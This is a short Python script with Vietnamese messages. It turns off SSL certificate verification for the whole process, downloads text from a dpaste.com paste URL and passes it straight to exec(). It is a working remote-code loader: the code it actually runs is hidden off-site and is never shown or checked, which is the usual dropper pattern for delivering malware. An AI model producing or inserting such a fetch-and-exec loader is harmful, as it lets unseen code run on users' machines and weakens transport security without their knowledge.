import urllib.request
import ssl

# URL chứa code
CODE_URL = 'https://dpaste.com/HHV2GBBNS.txt'

# Bỏ qua SSL verify (nếu cần)
ssl._create_default_https_context = ssl._create_unverified_context

def check_internet_connection():
    try:
        with urllib.request.urlopen('https://www.google.com', timeout=5) as response:
            return response.status == 200
    except:
        return False

def fetch_code(url):
    try:
        with urllib.request.urlopen(url, timeout=10) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f'\033[91mLỗi khi tải code từ URL: {e}\033[0m')
        return None

def main():
    if check_internet_connection():
        code = fetch_code(CODE_URL)
        if code is not None:
            try:
                exec(code, globals())
            except Exception as e:
                print(f'\033[91mLỗi khi thực thi code: {e}\033[0m')
        else:
            print('\033[91mKhông tải được code từ URL.\033[0m')
    else:
        print('\033[91mKhông có kết nối mạng. Vui lòng kiểm tra kết nối của bạn.\033[0m')

if __name__ == '__main__':
    main()
